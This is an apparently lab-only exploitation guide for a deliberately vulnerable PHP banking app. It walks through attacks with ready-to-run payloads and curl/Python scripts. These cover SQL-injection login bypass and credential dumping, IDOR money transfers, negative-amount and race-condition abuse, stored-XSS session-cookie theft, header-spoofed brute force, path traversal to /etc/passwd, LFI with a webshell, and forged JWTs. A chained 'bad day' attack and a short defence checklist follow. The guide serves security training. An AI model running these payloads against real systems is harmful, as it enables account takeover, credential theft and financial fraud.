# 🏦 Bank of VULN — Vulnerability Exploration Guide

> ⚠️ **Authorized-lab-only.** Everything here runs on `localhost` (XAMPP).
> The bank app is *deliberately* broken so you can practice the exact bugs
> demonstrated in the sibling demo files (`login.php`, `injection.php`,
> `broken-authorization.php`, `logic-flaw.php`, `race-condition.php`,
> `rate-limit.php`, `file-exposure.php`, `dev-file-leak.php`, `check.php`, …).
> Do not deploy this anywhere real.

---

## 0 · Setup

1. Start Apache + MySQL in the XAMPP control panel.
2. The app self-bootstraps on first request (creates DB `vulnerable_bank`,
   tables, and 4 seed accounts).
3. Open the dashboard:
   ```
   http://localhost/vunerability/bank-app/index.php
   ```
4. Log in with any seed account (or bypass the login entirely — see §1).

> ⚠️ **Write permission (once).** Apache runs as the `daemon` user; the
> rate-limit and cookie-sniffer demos write files into the app folder, so
> grant write access:
>
> ```bash
> chmod 777 /Applications/XAMPP/xamppfiles/htdocs/vunerability/bank-app
> ```

### Seed accounts

| id | username | email | password | role | balance | account # |
|----|----------|-------|----------|------|---------|-----------|
| 1 | admin | admin@bank.local | Admin@123 | **admin** | $999,999.99 | 1000000001 |
| 2 | alice | alice@bank.local | alice123 | user | $1,000.00 | 1000000002 |
| 3 | bob | bob@bank.local | bob123 | user | $500.00 | 1000000003 |
| 4 | mallory | mallory@bank.local | mallory123 | user | $25.00 | 1000000004 |

> Every exploit below assumes `BASE=http://localhost/vunerability/bank-app`.

---

## Map: bank feature → source demo

| Bank page | Vulnerability | Practiced from |
|-----------|---------------|----------------|
| `login.php` | SQLi auth bypass, error-based SQLi, plaintext pw, rate-limit bypass, client-trusted cookie | `login.php`, `injection.php`, `rate-limit.php`, `ip.php`, `broken-authorization.php` |
| `register.php` | SQLi INSERT, plaintext pw, stored XSS | `signup.php` |
| `index.php` | stored XSS (raw echo), non-HttpOnly session cookie | `signup.php` |
| `transfer.php` | IDOR, negative amount, overdraft, TOCTOU race, SQLi | `broken-authorization.php`, `logic-flaw.php`, `race-condition.php` |
| `bonus.php` | TOCTOU read-modify-write race | `race-condition.php` |
| `profile.php` | IDOR, password reset without auth, SQLi, stored XSS | `broken-authorization.php`, `signup.php` |
| `view-account.php` | IDOR (read any profile incl. password) | `broken-authorization.php` |
| `admin.php` | vertical privilege escalation via cookie, XSS sink | `broken-authorization.php` |
| `file.php` | path traversal, LFI → source / RCE | `file-exposure.php` |
| `api.php` | JWT `alg:none`, leaked secret, no expiry | `check.php`, `dev-file-leak.php` |
| `.env` / `config.php.bak` / `backup.sql` | dev file leak | `dev-file-leak.php` |

---

# PART A — "Havoc" playbook (go steal stuff)

## 1 · Bypass authentication (SQL Injection) 🔓

Goal: log in as **admin** without knowing the password.

Open `login.php`. In the **Email** box, use a classic tautology:

```
Email:    ' OR '1'='1' #
Password: anything
```

The query becomes:

```sql
SELECT * FROM users WHERE email='' OR '1'='1' #' AND password='...'
```

Everything after `#` is a comment → the password check is gone and the
query matches every row. The app logs you in as the **first** row = **admin**.

Variants (all work here):

```
admin' #                          → logs in as admin specifically
' OR 1=1 #                        → same as the tautology
' OR '1'='1' --                   → (-- needs a space after it)
' UNION SELECT 1,2,3,4,5,6,7,8,9 # → synthetic row, proves column count
```

Try the same payloads in the register form's email field, or via curl:

```bash
curl -s -c jar.txt -d "email='+OR+'1'='1'+%23&password=x&login=1" \
  $BASE/login.php -L -o /dev/null && echo "logged in as admin"
```

💡 The login page prints the **raw query** and **raw MySQL errors** in the
DEBUG box — that's your error-based oracle (see §2).

---

## 2 · Dump the entire users table (UNION / error-based SQLi) 📦

Goal: exfiltrate every email **and plaintext password**.

**Step 1 — find the column count.** `users` has 9 columns:

```
Email: ' ORDER BY 9 #    → works (login succeeds)
Email: ' ORDER BY 99 #   → SQL ERROR: Unknown column '99' in 'order clause'
```

**Step 2 — UNION the data out.** Each `UNION SELECT` must return exactly 9
values:

```
Email: ' UNION SELECT 1,2,3,4,5,6,7,8,9 #
```

Swap the placeholders for real columns (position 1,2,3,4,5,6,7 = id,
username, email, password, role, balance, account_number):

```
Email: ' UNION SELECT id,username,email,password,role,balance,account_number,8,9 FROM users #
```

The page logs you in as the synthetic row — but you can see the dumped
columns in the page, or simply log in as any stolen account with the
password you just extracted.

**Error-based (no UNION needed):**

```
Email: ' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) #
Email: ' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users))) #
```

The XML error message leaks the data directly.

💡 There is a brute-force helper in the parent folder you can reuse —
`find_columns.php` — it automates the `ORDER BY` step against the same
injection point.

---

## 3 · Read anyone's profile & password (IDOR) 👀

Goal: view other customers' data, no login required (just *a* login).

Any authenticated user can browse **every** account by walking the id in
the URL — there is no ownership or role check:

```
BASE/view-account.php?id=1   → admin's row, password Admin@123 in plaintext
BASE/view-account.php?id=2   → alice
BASE/view-account.php?id=3   → bob
```

Try `?id=0`, `?id=999999`, or even a SQLi in `?id=`:
```
BASE/view-account.php?id=1 OR 1=1
```

This is a horizontal-then-vertical escalation in one: you go from "some
random customer" to "every credential in the bank".

---

## 4 · Login and transfer money from another account (IDOR) 💸

Goal: log in as **bob**, then move money **out of admin's account**.

1. Log in as bob: `bob@bank.local` / `bob123`.
2. Go to `transfer.php`. Notice the **from** field is a hidden input.
3. Open DevTools (F12) → Elements, and change:
   ```html
   <input type="hidden" name="from_account" value="1000000003">
   ```
   to admin's account number:
   ```html
   <input type="hidden" name="from_account" value="1000000001">
   ```
4. Fill in `to_account = 1000000004` (your burner account), amount `500`,
   click **Transfer**.
5. Reload `index.php` — admin just lost $500, your burner gained it.

**The bug:** the server never checks that `from_account` belongs to the
logged-in user. The "from" must come from the server-side session, never
from the form.

Curl version (needs bob's session cookie in `jar.txt`):
```bash
curl -s -b jar.txt -d "from_account=1000000001&to_account=1000000004&amount=500&note=thanks&transfer=1" \
  $BASE/transfer.php | grep -o "Transferred[^<]*"
```

---

## 5 · Give yourself infinite money (negative amount) 💰

Goal: increase your balance without spending anything.

The `amount` field is never validated as `> 0`. Money math is just money
math — a **negative** transfer *adds* to the sender.

As bob (acct 1000000003, bal $500), send **-$1000** to any other account:

```bash
curl -s -b jar.txt -d "from_account=1000000003&to_account=1000000004&amount=-1000&note=refund&transfer=1" \
  $BASE/transfer.php
```

Result: `new_from = 500 - (-1000) = 1500` → **bob now has $1,500**,
mallory goes negative. Repeat in a loop to mint money:

```bash
for i in $(seq 1 20); do
  curl -s -b jar.txt -d "from_account=1000000003&to_account=1000000002&amount=-1000&note=oops&transfer=1" \
    $BASE/transfer.php -o /dev/null
done
curl -s -b jar.txt $BASE/index.php | grep -o '\$[0-9,]*\.\?[0-9]*'
```

💡 This is the same "negative quantity refund abuse" from `logic-flaw.php`:
the math is correct, the *business rule* ("you can't transfer a negative
amount") was never written in code. Bonus: there's no balance check either,
so you can also go massively overdrawn.

---

## 6 · Race the balance (TOCTOU double-spend) 🏁

Goal: turn one $10 bonus into more, or spend the same money twice.

The balance is updated as **read → compute → write** with no lock, no
transaction, no atomic `UPDATE`. Two simultaneous requests both read the
old balance and both write back — one update is **lost**.

### 6a · Race the daily bonus
Log in as bob, then fire 10 bonus claims at once:

```bash
curl -s -c jar.txt -d "email=bob@bank.local&password=bob123&login=1" $BASE/login.php -L -o /dev/null

for i in $(seq 1 10); do
  curl -s -b jar.txt -d "claim=1" $BASE/bonus.php -o /dev/null &
done
wait
curl -s -b jar.txt $BASE/index.php | grep -o '\$[0-9,]*\.\?[0-9]*'
```

You expect **+$100** (10 × $10). Because of lost updates you'll get
**less** — often only +$20 or +$30. Run it a few times; the number varies.

### 6b · Double-spend in a transfer
Send the same $500 from bob to two destinations at the *exact same time*:

```bash
curl -s -b jar.txt -d "from_account=1000000003&to_account=1000000004&amount=500&transfer=1" $BASE/transfer.php -o /dev/null &
curl -s -b jar.txt -d "from_account=1000000003&to_account=1000000002&amount=500&transfer=1" $BASE/transfer.php -o /dev/null &
wait
```

Both requests read `balance = 500`, both subtract 500, and the second write
clobbers the first — so both transfers "succeed" while bob only lost $500
once. That's a **double spend**.

💡 The correct pattern lives in `lock-transaction.php` (`SELECT ... FOR
UPDATE` inside a transaction). The bank app uses none of it.

---

## 7 · Take over another user (change their username/password) 🕵️

Goal: reset **admin's** password, then log in as admin.

`profile.php` reads the id to edit from `?id=` with **no ownership check**
and **no "current password" prompt**. Just visit:

```
BASE/profile.php?id=1
```

…and set the password to whatever you want. The form updates user id 1
(admin) directly. Then log in:

```bash
curl -s -d "email=admin@bank.local&password=YourNewPassword&login=1" $BASE/login.php -L -o /dev/null
curl -s -b jar.txt $BASE/index.php | grep -o 'Welcome back[^<]*'
```

Same trick works on any `?id=2..N`. You can also inject into the UPDATE:

```
Username: x', email='attacker@evil.com
```

→ the raw concatenation turns your username edit into an arbitrary
`UPDATE ... SET` — change the `role` column to `admin` if you like.

---

## 8 · Stored XSS → steal the admin's session 🍪

Goal: get JavaScript to run in a victim's browser and exfiltrate their
`PHPSESSID` so you can hijack their session.

**Step 1 — plant the payload.** Register a new account with a payload
username (stored raw, echoed raw everywhere). Use double quotes inside the
JS — a single quote would break the SQL INSERT *before* it's ever stored:

```
Username: <script>new Image().src="sniffer.php?c="+document.cookie</script>
```

**Step 2 — trigger it.** The payload fires in any of these views:
- your own dashboard (`index.php` echoes your username),
- the **admin panel** (`admin.php` echoes *all* usernames raw),
- `profile.php` (username field prefilled with the payload).

**Step 3 — catch the cookie.** The payload pings `sniffer.php`, which logs
into `bank-app/stolen.txt`:

```bash
cat $BASE/../bank-app/stolen.txt     # e.g. PHPSESSID=abcdef123...
```

**Step 4 — hijack.** The PHP session cookie has **no `HttpOnly` flag**
(XAMPP default), so JavaScript could read it. Paste the stolen `PHPSESSID`
into another browser's cookies (or use curl with the same cookie) and you
are now logged in as that victim — including admin.

Verify the cookie is readable from JS yourself:
```js
// in the browser console, after logging in normally:
document.cookie        // → "PHPSESSID=...; role=user; user_id=2"
```

💡 This mirrors the missing-escaping lesson from `signup.php`: every sink
that echoes user data must escape it (`htmlspecialchars`).

---

## 9 · Become admin (privilege escalation via cookie) 🛡️

Goal: get into the staff area without admin credentials.

1. Log in as any normal user.
2. Open `admin.php?admin=1` → "Access denied. You are not an admin."
3. DevTools → Application → Cookies → set:
   ```
   role = admin
   ```
4. Reload. The **full customer table — with plaintext passwords and
   balances** — is now yours.

**The bug:** the gate reads `$_COOKIE['role']` — a value your browser
fully controls — instead of the server-side `$_SESSION['role']`. Exactly
the cookie-tampering bug from `broken-authorization.php`.

---

## 10 · Brute-force the login (rate-limit bypass via X-Forwarded-For) 🔑

Goal: unlimited password guesses despite the "3 attempts per 60s" limiter.

The limiter keys on `X-Forwarded-For` — an HTTP header **you** control.
Rotate it and every request gets a fresh bucket.

First, get locked out the honest way (3 wrong passwords):

```bash
for i in 1 2 3; do
  curl -s -d "email=admin@bank.local&password=wrong&login=1" $BASE/login.php | grep -o "attempts[^<]*"
done
```

Now bypass the lock by faking your IP:

```bash
for i in $(seq 1 200); do
  curl -s -H "X-Forwarded-For: 10.0.0.$i" \
       -d "email=admin@bank.local&password=hunter$i&login=1" \
       $BASE/login.php | grep -o "SQL ERROR[^<]*\|Invalid credentials[^<]*\|Location: index.php" && echo "try #$i"
done
```

Each `X-Forwarded-For` value is a brand-new identity to the limiter. This
is the exact flaw from `rate-limit.php` and the IP-spoofing in `ip.php`.

---

## 11 · Read server files (path traversal) 📂

Goal: read the bank's source code and secrets off disk.

`file.php` joins `?file=` onto the app directory with **no allowlist and no
normalisation**. Try:

```
BASE/file.php?file=.env                     → DB creds + JWT secret + admin pw
BASE/file.php?file=config.php.bak           → same secrets in a "backup"
BASE/file.php?file=../database.php          → the DB connection source
BASE/file.php?file=../../../../../../etc/passwd   → system file (6 levels up)
BASE/file.php?file=../../../../../../etc/hosts
```

This app is 6 directories below `/`, so `/etc/passwd` needs 6 `../`
segments — extras are harmless:

```
BASE/file.php?file=../../../../../../../../../etc/passwd
```

URL-encode the slashes if a filter ever strips `../`:
```
BASE/file.php?file=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

💡 Reading `../database.php` as text is **source disclosure** — the whole
point of `file-exposure.php`. You just replayed it against a live app.

---

## 12 · Local File Inclusion (LFI) → source leak / RCE 💣

`file.php?page=` is passed to `include()` — the file is **executed as PHP**.

**Source disclosure** (php:// filter — the file is read *through* the filter
before PHP parses it, so you get the source, base64-encoded):

```
BASE/file.php?page=php://filter/convert.base64-encode/resource=database.php
```

Decode the output:

```bash
echo 'PD9waHA...' | base64 -d
```

**Local file inclusion** (read a real file, e.g. the leaked backup):

```
BASE/file.php?page=../config.php.bak
```

**RCE** (if you can plant a PHP file — e.g. write a webshell via the
stored-XSS + file write, or poison a log, then include it):

```
BASE/file.php?page=../../../../../tmp/shell.txt&c=id
```

This is the same "just read a file" → "full server takeover" escalation
from `file-exposure.php`. The include **must never** take user input.

---

## 13 · Steal the secrets from leaked dev files 🗝️

No exploit needed — the files are just *sitting in the web root*:

```
BASE/.env            → DB_HOST/DB_USER/DB_PASS/DB_NAME + JWT_SECRET
                       + Stripe / SendGrid / Twilio keys + admin password
BASE/config.php.bak  → same secrets, "backup" style
BASE/backup.sql      → a full DB dump with plaintext passwords
BASE/schema.sql      → schema reference (harmless, but it's there)
```

Example: the leaked `.env` gives you `JWT_SECRET=change_me_bank_super_secret_123`
— which is exactly what you need for §14.

💡 This is the "dev file leak" class from `dev-file-leak.php`: `.env`,
`.bak`, `.sql`, `.git/`, `package.json`… anyone who guesses the filename
wins.

---

## 14 · Forge a JSON Web Token (JWT) 🔐

Goal: call the internal API as **admin** with a token you minted yourself.

### 14a · `alg: none` (no secret needed)

`api.php` trusts the token header and **skips signature verification** when
`alg` is `none`. Mint an unsigned admin token:

```bash
python3 - <<'PY'
import base64, json
def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
h = b64({"alg":"none","typ":"JWT"})
p = b64({"sub":"admin","role":"admin","iat":0})
print(f"{h}.{p}.")
PY
```

Then use it (the `Authorization` header, or `?token=`):

```bash
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MH0."
curl -s -H "Authorization: Bearer $TOKEN" $BASE/api.php
curl -s "$BASE/api.php?token=$TOKEN"
```

It answers `"role": "admin"` — the API trusts the (forged) payload.

### 14b · Forge a *signed* token with the leaked secret

You already read the secret from `.env` (§13). Use it to forge a real
HS256 token:

```bash
python3 - <<'PY'
import base64, hashlib, hmac, json
def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
h = b64({"alg":"HS256","typ":"JWT"})
p = b64({"sub":"admin","role":"admin","iat":0})
secret = "change_me_bank_super_secret_123"
sig = base64.urlsafe_b64encode(
    hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
).rstrip(b'=').decode()
print(f"{h}.{p}.{sig}")
PY
```

💡 See `check.php` in the parent folder for the raw JWT decode. And note the
token has **no `exp` claim** — it never expires. All of this is made
possible by the secret leaking in `.env`.

---

# PART B — Full "bad day" chain (everything at once)

A single coherent attack that uses most of the lab in order:

1. **§13** — Download `file.php?file=.env` → get `JWT_SECRET` + admin password.
2. **§1** — SQLi the login as admin (`' OR '1'='1' #`), or just use the
   password you just leaked.
3. **§14** — Forge a JWT (`alg:none`) and confirm `api.php` calls you admin.
4. **§3** — Walk `view-account.php?id=1..N` to map every account + password.
5. **§7** — Reset a victim's password via `profile.php?id=N` (no auth check).
6. **§4** — Log in as the victim, change the hidden `from_account`, and
   drain admin's money with an IDOR transfer.
7. **§5** — Pump your own balance with negative-amount transfers.
8. **§8** — Plant stored XSS, get the admin panel (`admin.php`) to render it,
   steal the admin's `PHPSESSID` via `sniffer.php`, and hijack the session.
9. **§9** — Flip the `role` cookie to `admin` and read the full table.
10. **§11–12** — Path-traverse to `/etc/passwd` and LFI the DB source.
11. **§6 / §10** — Race the balance and brute-force the login for fun.

---

# PART C — Defence checklist (what a real bank must do)

| Vulnerability | Fix |
|---------------|-----|
| SQLi | Prepared statements / parameterized queries everywhere; never concatenate input. `lock-transaction.php` shows the safe transfer pattern. |
| Stored XSS | `htmlspecialchars()` on **all** output; `HttpOnly` + `Secure` session cookies; CSP. |
| Plaintext passwords | `password_hash()` / `password_verify()` (bcrypt/argon2). |
| IDOR | Server-side session is the only source of "who am I"; check ownership on every object access (`?id` must equal `$_SESSION['user_id']` unless admin). |
| Privilege escalation | Role lives in the **session**, set by the server at login — never in a cookie/header/JWT payload you trust blindly. |
| Logic flaws | Price/amount always from the server (DB), never the form; enforce `amount > 0`; enforce no-overdraft server-side; enforce one-use coupons atomically. |
| Race conditions | `SELECT ... FOR UPDATE` + transaction, or atomic `UPDATE users SET balance = balance - ? WHERE balance >= ?`; single-statement operations. |
| Rate limiting | Key on `REMOTE_ADDR` (trust only headers from a proxy *you* control), limit per-IP **and** per-account; atomic counters (Redis `INCR`). |
| File exposure | Allowlist file names; `realpath()` + prefix check; never `include()` user input; block `.env`, `.git`, `*.bak`, `*.sql` in Apache; keep secrets **out** of the web root; `open_basedir`. |
| JWT | Reject `alg:none`; pin `HS256` server-side; verify signature with a secret stored **outside** the web root; validate `exp`/`nbf`/`aud`. |

---

*Every line of the bank app is intentionally vulnerable. Fix one bug,
re-test, and watch the corresponding § collapse.*
